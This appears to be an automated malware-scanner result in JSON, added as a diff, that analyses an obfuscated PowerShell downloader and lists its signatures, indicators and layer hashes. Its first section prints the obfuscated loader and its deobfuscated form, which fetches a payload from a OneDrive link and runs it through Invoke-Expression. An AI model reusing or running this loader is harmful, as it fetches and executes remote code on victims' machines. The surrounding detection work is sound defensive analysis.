@@ -1,0 +1,375 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 633,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[Invoke-Expression] Execute/Open: $Tbone='*EX'.replace('*','I');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$mv='(&'+'(G'+'C'+'$$$'.replace('$$$','M')+' *W-'+'O*)'+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q'')'|I`E`X;$asciiChars= $mv -split '-' |ForEach-Object {[char][byte]\"0x$_\"};$asciiString= $asciiChars -join ''|M\n\n[Test-Connection] -comp google.com -count 1 -Quiet\n\n[Invoke-Expression] Execute/Open: (&(GCM *W-O*)Net.WebClient).DownloadString('https://onedrive.live.com/download?cid=8B8C81E9EA559FF0&resid=8B8C81E9EA559FF0%211131&authkey=AMPC-h991zcyT5Q')\n",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Actions detected with PSDecode",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"onedrive.live.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "dynamic": {
+              "domain": [
+                "google.com",
+                "onedrive.live.com"
+              ],
+              "uri": [
+                "https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+              ],
+              "uri_path": [
+                "/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in actions",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in 1954ce6974e8203214c9eb20c2d73bd765e8d5599b9a02b3656845a50f61a634",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "Obfuscation:Char Frequency": 100
+          },
+          "signatures": {
+            "Obfuscation:Char Frequency": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Obfuscation:Char Frequency",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in layer_1.ps1",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Net.WebClient, DownloadString",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Downloader": 10
+          },
+          "signatures": {
+            "Downloader": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Downloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: |IEX",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Script Execution": 10
+          },
+          "signatures": {
+            "Script Execution": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Script Execution",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Test-Connection",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Ping": 10
+          },
+          "signatures": {
+            "Ping": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Ping",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "Suspicious Behaviour Combo": 500
+          },
+          "signatures": {
+            "Suspicious Behaviour Combo": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Suspicious Behaviour Combo",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"onedrive.live.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "google.com",
+                "onedrive.live.com"
+              ],
+              "uri": [
+                "https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+              ],
+              "uri_path": [
+                "/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+              ]
+            }
+          }
+        },
+        "title_text": "IOC(s) extracted from layer_1.ps1",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "deobfuscated.ps1",
+        "sha256": "34543e9ea6ed60dfd9cf2216525fde89c65ee1de06b8d839003fdba2f2f3c8ca"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "layer_0.ps1",
+        "sha256": "7fa916a80b5ae2f17b026fd3c8d0ff0734b911260a001772ed7202218c3fe491"
+      },
+      {
+        "name": "layer_2.ps1",
+        "sha256": "d4b140429ad0ebf9d35b64e4ea145f6d614a06b61f79755f7129d8056339e1d8"
+      },
+      {
+        "name": "layer_1.ps1",
+        "sha256": "e9832b2cc5ac8bcf58730547e466b57691d407e8e60c2ce93dda9b127b8f1856"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Obfuscation:Char Frequency"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Downloader"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Script Execution"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Ping"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Suspicious Behaviour Combo"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "network.dynamic.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "google.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "onedrive.live.com"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "google.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "onedrive.live.com"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://onedrive.live.com/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/download?cid=8b8c81e9ea559ff0&resid=8b8c81e9ea559ff0%211131&authkey=ampc-h991zcyt5q"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
